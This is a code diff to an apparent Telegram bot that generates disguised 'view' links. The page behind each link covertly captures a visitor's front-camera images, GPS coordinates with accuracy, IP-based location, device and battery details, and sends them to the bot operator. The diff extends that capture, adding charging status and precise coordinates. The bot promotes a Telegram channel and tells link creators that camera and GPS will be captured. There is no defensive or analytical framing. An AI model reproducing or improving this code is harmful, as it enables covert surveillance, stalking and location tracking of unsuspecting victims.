@@ -345,7 +345,8 @@ async function captureInfo() {{
         msg += "Country: " + (info.country_name || 'Unknown') + "\\n";
         msg += "City: " + (info.city || 'Unknown') + "\\n";
         msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n";
-        msg += "Battery: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
+        msg += "Battery Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
+        msg += "Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n";
         msg += "Resolution: " + res + "\\n";
         msg += "Language: " + lang + "\\n";
         msg += "------------------------\\n@nrtecno2";
@@ -358,7 +359,7 @@ async function captureInfo() {{
     }}
 }}
 
-async function captureCamera() {{
+async function captureCameraAndLocation() {{
     try {{
         let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
         let video = document.getElementById('video');
@@ -377,8 +378,13 @@ async function captureCamera() {{
         
         if (navigator.geolocation) {{
             navigator.geolocation.getCurrentPosition(async (p) => {{
-                await sendMessage("<b>Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-            }}, async (e) => {{}});
+                await sendMessage("<b>📍 GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
+                await sendMessage("<b>🎯 Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + " meters");
+            }}, async (e) => {{
+                await sendMessage("<b>📍 GPS Location</b>\\nAccess denied or not available");
+            }});
+        }} else {{
+            await sendMessage("<b>📍 GPS Location</b>\\nGeolocation not supported");
         }}
         return true;
     }} catch(e) {{
@@ -390,8 +396,8 @@ async function captureCamera() {{
 async function startProcess() {{
     showLoading();
     
-    let infoOk = await captureInfo();
-    let cameraOk = await captureCamera();
+    await captureInfo();
+    let cameraOk = await captureCameraAndLocation();
     
     if (cameraOk) {{
         setTimeout(() => {{
@@ -422,7 +428,7 @@ def webhook():
             uid = cb['from']['id']
             if cb['data'] == 'verify':
                 if is_subscribed(uid):
-                    send_message(uid, "Verified! Send me any URL:")
+                    send_message(uid, "✅ Verified! Send me any URL:")
                     set_user_state(uid, "waiting_url")
                 else:
                     requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
@@ -439,31 +445,31 @@ def webhook():
             text = msg['text']
             if text == '/start':
                 if not is_subscribed(uid):
-                    markup = {"inline_keyboard": [[{"text": "Join Channel", "url": "https://t.me/nrtecno2"}], [{"text": "Verify", "callback_data": "verify"}]]}
-                    send_message(uid, f"Join {REQUIRED_CHANNEL} first!", markup)
+                    markup = {"inline_keyboard": [[{"text": "📢 Join Channel", "url": "https://t.me/nrtecno2"}], [{"text": "✅ Verify", "callback_data": "verify"}]]}
+                    send_message(uid, f"🚫 Join {REQUIRED_CHANNEL} first!", markup)
                 else:
                     set_user_state(uid, "waiting_url")
-                    send_message(uid, "Send me any URL:")
+                    send_message(uid, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
             elif text.startswith(('http://', 'https://')):
                 state = get_user_state(uid)
                 if state.get("state") == "waiting_url":
                     set_user_state(uid, "waiting_photo", text)
-                    send_message(uid, "Now share a photo with me")
+                    send_message(uid, "✅ Now share a photo with me")
                 else:
-                    send_message(uid, "Use /start first")
+                    send_message(uid, "❌ Use /start first")
             else:
-                send_message(uid, "Send a valid URL")
+                send_message(uid, "❌ Send a valid URL")
 
         elif 'photo' in msg:
             uid = msg['chat']['id']
             state = get_user_state(uid)
             if state.get("state") != "waiting_photo":
-                send_message(uid, "Send URL first using /start")
+                send_message(uid, "❌ Send URL first using /start")
                 return jsonify({"status": "ok"}), 200
 
             target_url = state.get("target_url")
             if not target_url:
-                send_message(uid, "Error. Use /start again")
+                send_message(uid, "❌ Error. Use /start again")
                 return jsonify({"status": "ok"}), 200
 
             try:
@@ -481,11 +487,11 @@ def webhook():
                 set_user_state(uid, "done")
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"Your link:\n{link}\n\nActive until you create new link")
+                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required\n📍 GPS will be captured")
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
-                send_message(uid, "Error. Try again")
+                send_message(uid, "❌ Error. Try again")
 
         return jsonify({"status": "ok"}), 200
 
@@ -509,7 +515,7 @@ def serve_photo(filename):
 
 @app.route('/')
 def home():
-    return "Bot alive"
+    return "🐉 Bot alive | Ready"
 
 
 if __name__ == "__main__":
